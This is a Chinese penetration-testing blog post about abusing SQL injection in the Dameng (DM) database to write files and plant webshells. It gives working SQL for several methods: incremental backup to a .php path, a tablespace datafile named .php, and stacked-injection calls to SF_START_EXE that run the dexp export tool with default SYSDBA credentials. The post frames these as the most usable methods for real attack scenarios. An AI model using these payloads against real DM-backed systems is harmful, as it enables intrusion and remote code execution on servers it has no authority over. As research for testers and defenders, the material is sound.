<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/rBubgSxcub2S1KAQoblNQA)

**0x01 前沿**

这篇文章整体算是[《达梦数据库手工注入笔记》](https://mp.weixin.qq.com/s?__biz=MzkzNjMxNDM0Mg==&mid=2247486030&idx=1&sn=d26423606833afc64de3d83f38feec4e&chksm=c3ccfe61dec5dfaab8a35162e26a526fa0229a2c963b9541d3642895ad2c1001b84335247d4a&scene=21&sessionid=1714545321#wechat_redirect)的续集，达梦作为国内优秀的信创数据库，在关基单位中拥有越来越大的用户使用量。

通过 SQL 注入来写文件一直以来都是 SQL 注入漏洞深入利用的一种方式，对于不同的数据库通常写文件的方式也是不一样的。通过笔者的探索发现，达梦数据库（以后简称 DMSQL）写文件的方式也与其它数据库存在较大的差异。

DMSQL 默认情况下是支持堆叠注入的（笔者试了官方给的 java 版本的 SDK，其它版本未尝试），也就是说在注入的时候支持多语句，支持多语句为攻击者提供了对 SQL 注入漏洞进行深入利用的遐想，也使得本文利用 DMSQL 写文件的研究具有实际意义。

**0x02 探索**

熟悉渗透的小伙伴都会有一些通过 SQL 注入写文件的技巧，我们首先通过两种经典的写文件方式来探索达梦写文件的不同。

**1） 通过 into outfile 方式写文件**

在 MySQL 数据库中可以通过经典的 into outfile 来把查询结果保存在文件中，但是在 DMSQL 中并没有相应的语法，也没有 into dumpfile 的语法，如下图所示：

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/4yJaCArQwpA3VzwL9hR5KJTib2vRfWB7LicSib6vtdfnwQD9BPzO0UpKhsqpGGoHia21ticPPVgZsw7HICYlryKBECw/640?wx_fmt=jpeg&from=appmsg)

**2） 通过 backup database 方式写文件**

在 MSSQL 数据库中可以通过备份的方式来写文件，而且在 DMSQL 中也存在相似的语法，如下图所示：

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/4yJaCArQwpA3VzwL9hR5KJTib2vRfWB7LkBgFIFTEtOfdcNOWLaic2RdusoTZDrF6dMYoj4ebIgE8qrvTBE8bSbA/640?wx_fmt=jpeg&from=appmsg)

本以为应该是以与 MSSQL 相似的手法就可以直接备份写文件，但在实际使用过程中发现并非如此，DM 数据库默认是不允许进行备份的，必须首先开启归档模式才能进行备份。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/4yJaCArQwpA3VzwL9hR5KJTib2vRfWB7LZb5DjkUKd2lHEHWcDLsQM1eJ9yb6ZYtsOfDljputVMRmS7KOCEa28Q/640?wx_fmt=jpeg&from=appmsg)

在默认安装的 DM 数据库中，要通过备份数据库的功能实现文件写入，完整的代码如下：

```
-- 使数据库转变为OPEN模式
alter database open; 
-- 先完整的对数据 进行一次备份,目录不存在会自动创建
backup database backupset 'C:\phpstudy_pro\WWW\xxx\';
-- 新建一张表并向表中写入一条带有webshell的数据。其中DEM换成实际可以建表的库名
CREATE TABLE "DEM"."EXP14"
(
"id" INTEGER NOT NULL,
"name" VARCHAR(50),
"content" VARCHAR(50)) STORAGE(ON "MAIN", CLUSTERBTR) ;
insert into "DEM"."EXP14" values(1,'aaa', '<?php phpinfo(); ?>');
-- 增量备份,，并定义保存文件路径和调试文件路径
BACKUP DATABASE increment BACKUPSET 'C:\phpstudy_pro\WWW\121.php' TRACE FILE  'C:\phpstudy_pro\WWW\213.php' TRACE LEVEL 2;

```

使用上面的代码可以在系统上生成文件，由于 DM 备份时可以指定保存文件的路径，生成的文件名和路径有关，整体文件目录结构如下：

```
121.php  (目录)
121.php.bak （文件）
121.php.meta （文件）
121.php_1.bak （文件）
213.php （文件）

```

这里面 C:\phpstudy_pro\WWW\121.php\121.php.bak 文件中保存了备份表中内容信息，如果系统本身存在解析漏洞，可以通过这种方式来达到 getshell 的效果。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/4yJaCArQwpA3VzwL9hR5KJTib2vRfWB7LTpL7ibsmZGwCX0Xe89MIrcfaGLcqiapv7qfpKfXjwnW6QxXSVDibRTxhA/640?wx_fmt=png&from=appmsg)

C:\phpstudy_pro\WWW\213.php 文件中保存了备份过程日志信息，虽然文件名可以自定义，但是内容并不能任意控制，导致并不能通过 TRACE FILE 来 getshell。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/4yJaCArQwpA3VzwL9hR5KJTib2vRfWB7LvZbv9tOq52R21XrLr8eSeJY5KHrpS94KOKvQCKKCpWSjujd6bYp4QQ/640?wx_fmt=png&from=appmsg)

通过 backup 语句来写文件并不能完整的控制文件名和文件内容，导致只能在特定场景下可以使用，并不是一个好的写文件思路。

**3） 通过自定义命名空间来写文件**

创建表空间（tablespace）是为了更好地管理数据库的物理存储结构。不同的表空间可以存储在不同的磁盘上，有助于优化 I/O 性能，同时也可以实现数据的逻辑分组。目前许多数据库包括 oracle、postgreSQL 等都支持自定义表空间，达梦也支持自定义表空间，可以通过此种方式来写文件，具体的写法如下：

```
-- 创建表空间，自定义表空间保存的文件路径和名字
create tablespace "xiao3" datafile 'C:\phpstudy_pro\WWW\xiao3.php' size 32;
-- 向自定义的表空间创建一张表，并插入带webshell的内容
CREATE TABLE "DEM"."EXP15"
(
"id" INTEGER NOT NULL,
"name" VARCHAR(50),
"content" VARCHAR(50)) STORAGE(ON "xiao3", CLUSTERBTR);
insert into "DEM"."EXP15" values(1,'aaa', '<?php phpinfo(); ?>');

```

访问生成的 C:\phpstudy_pro\WWW\xiao3.php 文件，可以实现代码解析。  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/4yJaCArQwpA3VzwL9hR5KJTib2vRfWB7L5gRvq87XgNsNwlRq1Fzzhrib0ia4VME8e4TgBA0wauVjCPNk173WvwFw/640?wx_fmt=png&from=appmsg)

通过自定义命名空间的方式来写文件可以实现完全自主可控的文件名和文件内容，对用户权限要求也不是很高，但是缺点是文件太大（我默认安装的 DM，最小的文件是 32M）。

本以为通过这种方式就可以在存在 SQL 注入漏洞的点通过自定义命名空间来达到任意文件写入的效果，但在实际的环境中遇到了报错 “语句类型不匹配”。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/4yJaCArQwpA3VzwL9hR5KJTib2vRfWB7Lqe07MMgM9zdcSBFN1Spbgd1MZhjG5qe9pJMgbJRld7eG2Hx0dSiajyQ/640?wx_fmt=png&from=appmsg)

这主要是因为针对不同类型的 SQL 语句，通常需要调用不同的方法来执行，在 Java 语言中，DM 通过 dm.jdbc.driver.DmdbStatement 类提供数据操作方法。

<table width="100%"><tbody><tr opera-tn-ra-comp="_$.pages:0.layers:0.comps:46.classicTable1:0"><td colspan="1" rowspan="1" opera-tn-ra-cell="_$.pages:0.layers:0.comps:46.classicTable1:0.td@@0" width="33.0000%"><section><section><p><strong>方法</strong></p></section></section></td><td colspan="1" rowspan="1" opera-tn-ra-cell="_$.pages:0.layers:0.comps:46.classicTable1:0.td@@1" width="33.0000%"><section><section><p><strong>作用</strong></p></section></section></td><td colspan="1" rowspan="1" opera-tn-ra-cell="_$.pages:0.layers:0.comps:46.classicTable1:0.td@@2" width="34.0000%"><section><section><p><strong>示例</strong></p></section></section></td></tr><tr opera-tn-ra-comp="_$.pages:0.layers:0.comps:46.classicTable1:1"><td colspan="1" rowspan="1" opera-tn-ra-cell="_$.pages:0.layers:0.comps:46.classicTable1:1.td@@0" width="33.0000%"><section><section><p>executeQuery</p></section></section></td><td colspan="1" rowspan="1" opera-tn-ra-cell="_$.pages:0.layers:0.comps:46.classicTable1:1.td@@1" width="33.0000%"><section><section><p>执行查询类语句，返回相应查询结果</p></section></section></td><td colspan="1" rowspan="1" opera-tn-ra-cell="_$.pages:0.layers:0.comps:46.classicTable1:1.td@@2" width="34.0000%"><section><section><p>SELECT * FROM users WHERE "id"=1</p></section></section></td></tr><tr opera-tn-ra-comp="_$.pages:0.layers:0.comps:46.classicTable1:2"><td colspan="1" rowspan="1" opera-tn-ra-cell="_$.pages:0.layers:0.comps:46.classicTable1:2.td@@0" width="33.0000%"><section><section><p>executeUpdate</p></section></section></td><td colspan="1" rowspan="1" opera-tn-ra-cell="_$.pages:0.layers:0.comps:46.classicTable1:2.td@@1" width="33.0000%"><section><section><p>执行修改类语句，返回是否修改成功</p></section></section></td><td colspan="1" rowspan="1" opera-tn-ra-cell="_$.pages:0.layers:0.comps:46.classicTable1:2.td@@2" width="34.0000%"><section><section><p>UPDATE users SET "name"=’xxx’ where "id"=1</p></section></section></td></tr><tr opera-tn-ra-comp="_$.pages:0.layers:0.comps:46.classicTable1:3"><td colspan="1" rowspan="1" opera-tn-ra-cell="_$.pages:0.layers:0.comps:46.classicTable1:3.td@@0" width="33.0000%"><section><section><p>execute</p></section></section></td><td colspan="1" rowspan="1" opera-tn-ra-cell="_$.pages:0.layers:0.comps:46.classicTable1:3.td@@1" width="33.0000%"><section><section><p>执行所有 SQL 语句，返回语句是否执行成功</p></section></section></td><td colspan="1" rowspan="1" opera-tn-ra-cell="_$.pages:0.layers:0.comps:46.classicTable1:3.td@@2" width="34.0000%"><section><section><p>CREATE TABLESPACE "namex" DATAFILE ‘/dbms/namex’ SIZE 32</p></section></section></td></tr></tbody></table>

从上表可以看出一般系统中存在的 SQL 注入漏洞是在 executeQuery 方法中，通过这个方法传入自定义命名空间的 SQL 语句，则会报 “语句类型不匹配” 的异常，导致写文件失败。

**4） 通过 dexp 文件导出方式写文件**

dexp 是 DM 官方提供的文件导出的命令行工具，如下图所示。dexp 提供了可以把数据表导出成本地文件的功能，并支持自定义导出的文件名。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/4yJaCArQwpA3VzwL9hR5KJTib2vRfWB7LvdFedkdvVugLfd4EsFADgsOqS5ibU6Zoz4iaxk9RycfZMg9HcZX8ic6Lg/640?wx_fmt=png&from=appmsg)

本来 dexp 是命令行的工具，在 DM 数据库 SQL 语句中并不能直接使用，但是 DM 提供了预定义的函数 SF_START_EXE 可以调用 dexp 方法，使用方法如下所示：  

```
SF_START_EXE('dexp', 'SYSDBA/SYSDBA@127.0.0.1:5236 FILE=mi.php DIRECTORY=C:\tmp\ TABLES=EXY.EXP',0,'/');
TABLES=EXY.EXP 代表可控内容的一张表，表中包含有webshell信息
FILE=mi.php 自定义文件名
DIRECTORY=C:\tmp\ 自定义文件路径
SYSDBA/SYSDBA@127.0.0.1:5236 DM数据库地址端口及对应的账号密码

```

模拟在 executeQuery 方法中存在的 SQL 注入漏洞，通过堆叠注入调用 SF_START_EXE 方法来写文件，如下图所示：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/4yJaCArQwpA3VzwL9hR5KJTib2vRfWB7L6jFFibr6XFibwVDFPPKPHHL4ExsjS2QTrbiaNlcQgQV2UX1az4giaTnABw/640?wx_fmt=png&from=appmsg)

通过 SF_START_EXE 来写文件不会触发 “语句类型不匹配” 的问题，并且支持完全可控的自定义文件名和路径，是目前为止最好用的通过 DM 数据库 SQL 注入来写文件的方式之一。  

**0x03 总结**

DM 数据库本身提供了很多写文件的方式，但是能在实际攻击场景中使用的写文件方法并不多。目前关于 DM 数据库特性研究的文章还不是很多，SF_START_EXE 是目前笔者实际测试中最好用的方法。